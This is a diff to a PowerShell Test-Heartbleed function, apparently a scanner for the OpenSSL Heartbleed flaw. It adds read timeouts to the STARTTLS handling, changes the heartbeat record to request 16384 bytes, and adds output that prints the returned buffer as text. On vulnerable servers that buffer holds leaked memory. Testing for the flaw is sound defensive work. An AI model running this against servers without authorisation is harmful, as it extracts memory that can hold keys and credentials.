@@ -197,8 +197,8 @@ function Test-Heartbleed
         
         # 32-byte heartbeat, follow by zero byte safe request.
         $safe_heartbeat = [Byte[]] (
-            0x18, 0x03, 0x02, 0x00, 0x23, 
-            0x01, 0x00, 0x20 + (,0x11 * 32) + `
+            0x18, 0x03, 0x02, 0x40, 0x03, 
+            0x01, 0x40, 0x00 + (,0x11 * 16384) + `
             0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x00, 0x00
         )
 
@@ -243,13 +243,23 @@ function Test-Heartbleed
             # any bytes waiting?  read them...
             $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
             $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+            if (!$wait)
+            {
+                return $true
+            }
             $n = $stream.EndRead($awh)
 
             if ($STLSProto -eq "FTP")
             {
                 $cmd = [System.Text.Encoding]::UTF8.GetBytes("AUTH TLS`r`n")
                 $stream.Write($cmd,0,$cmd.Length)
-                $n = $stream.Read($resp,0,$resp.length)
+                $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if (!$wait)
+                {
+                    return $true
+                }
+                $n = $stream.EndRead($awh)
                 if (!$resp -match "^234")
                 {
                     return $false
@@ -264,9 +274,16 @@ function Test-Heartbleed
                 {
                     return $false
                 }
+
                 $cmd = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n")
                 $stream.Write($cmd,0,$cmd.Length)
-                $n = $stream.Read($resp,0,$resp.length)
+                $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if (!$wait)
+                {
+                    return $true
+                }
+                $n = $stream.EndRead($awh)
             }
             elseif ($STLSProto -eq "POP")
             {
@@ -277,9 +294,17 @@ function Test-Heartbleed
                 {
                     return $false
                 }
+
                 $cmd = [System.Text.Encoding]::UTF8.GetBytes("STLS`r`n")
                 $stream.Write($cmd,0,$cmd.Length)
-                $n = $stream.Read($resp,0,$resp.length)
+                $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if (!$wait)
+                {
+                    return $true
+                }
+                $n = $stream.EndRead($awh)
+
             }
             elseif ($STLSProto -eq "IMAP")
             {
@@ -290,9 +315,16 @@ function Test-Heartbleed
                 {
                     return $false
                 }
+
                 $cmd = [System.Text.Encoding]::UTF8.GetBytes("A2 STARTTLS`r`n")
                 $stream.Write($cmd,0,$cmd.Length)
-                $n = $stream.Read($resp,0,$resp.length)
+                $awh = $stream.BeginRead($resp,0,$resp.Length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if (!$wait)
+                {
+                    return $true
+                }
+                $n = $stream.EndRead($awh)
             }
             return $true
         }
@@ -303,7 +335,7 @@ function Test-Heartbleed
         foreach($computer in $Computername)
         {
             $vulnerable = $true
-            Write-Verbose -Message "Testing $($computer)"
+            Write-Verbose -Message "Testing $computer, tcp port $Port"
             $IP = [System.Net.Dns]::GetHostByName($computer).AddressList[0].IPAddressToString
             $offset = 0
             $response = New-Object -TypeName Byte[] 16384
@@ -321,16 +353,21 @@ function Test-Heartbleed
                 $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
 
                 # get TLS server hello
-                $n = $stream.Read($response,0,$response.length)
-            
+                $awh = $stream.BeginRead($response,0,$response.length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if(!$wait) 
+                {
+                    Throw [System.Exception] "No response to TLS Client Hello.  Maybe you should disable STARTTLS?"
+                }
                 if ( $response[0] -ne 0x16) 
                 {
-                    Throw [System.Exception] "Malformed TLS Server Hello"
+                    Throw [System.Exception] "Malformed TLS Server Hello.  Do you need STARTTLS?"
                 }
+                $n = $stream.EndRead($awh)
     
                 Write-Verbose -Message "Sending Heartbeat support test packet"
                 $stream.Write($safe_heartbeat,0,$safe_heartbeat.Length)
-                $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
+                $awh = $stream.BeginRead($buf,0,$buf.length-$offset,$null,$null)
                 $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                 if(!$wait) 
                 {
@@ -339,6 +376,7 @@ function Test-Heartbleed
                     # don't try further connections
                     $TLSTries = 0
                 }
+                $n = $stream.EndRead($awh)
             }
             Catch 
             {
@@ -352,6 +390,7 @@ function Test-Heartbleed
                 }
             }
 
+            $buf.Clear()
             # perform connection attempts
             for ($nt = 0; $nt -lt $TLSTries; $nt++) {
                 $msg = "Connection attempt number: {0}" -f ($nt + 1)
@@ -434,10 +473,11 @@ function Test-Heartbleed
             
             $result = New-Object -TypeName psobject -Property @{
                 "Host" = $computer
+                "Port" = $Port
                 "Vulnerable" = $vulnerable
                 "Bytes" = ($buf[0..$offset])
-                #"Base64" = [System.Convert]::ToBase64String($buf[0..$offset])
-                "String" = [System.Text.Encoding]::ASCII.GetString(($buf[0..$offset]))
+                "String" = [System.Text.Encoding]::UTF7.GetString(($buf[0..$offset])) -replace '[^\x20-\x7E]*', ''
+                "Offset" = $offset
             }
             $result
 
